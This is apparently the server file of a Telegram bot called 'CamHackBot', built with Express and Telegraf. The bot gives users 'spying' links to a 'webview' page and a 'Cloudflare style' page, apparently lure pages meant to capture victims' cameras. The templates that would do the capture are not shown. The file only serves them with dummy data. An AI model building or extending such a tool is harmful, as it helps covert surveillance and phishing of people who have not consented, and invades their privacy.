const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
const ejs = require('ejs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Get token securely from environment variable
const BOT_TOKEN = process.env.BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error("❌ BOT_TOKEN is missing in environment variables!");
  process.exit(1); // stop the server
}

const bot = new Telegraf(BOT_TOKEN);

// 👉 Bot command
bot.start((ctx) => {
  ctx.reply("👋 Welcome to CamHackBot!\n\nUse /webview or /cloudflare to get your spying link.");
});

// 👉 WebView link command
bot.command("webview", (ctx) => {
  const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/webview`;
  ctx.reply(`🔗 WebView link:\n${link}`);
});

// 👉 Cloudflare style link
bot.command("cloudflare", (ctx) => {
  const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/cloudflare`;
  ctx.reply(`🔗 Cloudflare style link:\n${link}`);
});

// Dummy data
const dummyData = {
  uid: 'abc123456',
  url: 'https://example.com',
  ip: '123.123.123.123',
  time: new Date().toLocaleTimeString(),
  t: false,
  a: 'https://example.com/api'
};

// 👉 Render webview
app.get('/webview', (req, res) => {
  ejs.renderFile(path.join(__dirname, 'webview.ejs'), dummyData, {}, (err, str) => {
    if (err) return res.status(500).send(err.toString());
    res.send(str);
  });
});

// 👉 Render cloudflare
app.get('/cloudflare', (req, res) => {
  ejs.renderFile(path.join(__dirname, 'cloudflare.ejs'), dummyData, {}, (err, str) => {
    if (err) return res.status(500).send(err.toString());
    res.send(str);
  });
});

// Test route
app.get('/', (req, res) => {
  res.send('✅ CamHackBot is live!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`);
  await bot.launch();
});
